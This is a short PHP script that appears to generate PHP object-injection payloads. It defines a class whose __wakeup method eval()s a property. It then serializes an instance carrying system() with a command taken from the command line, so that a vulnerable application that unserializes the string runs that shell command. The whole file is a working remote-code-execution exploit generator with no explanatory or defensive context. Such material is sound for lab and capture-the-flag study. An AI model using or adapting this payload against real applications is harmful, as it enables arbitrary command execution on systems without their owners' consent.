<?php

class suntikan{
    public $inject;
    function __construct(){
    }
    function __wakeup(){
        if(isset($this->inject)){
            eval($this->inject);
        }
    }
}

$object = new suntikan();
$object->inject = str_replace("COMMAND", $argv[1], "system('COMMAND');");
$serialized = serialize($object);

echo $serialized;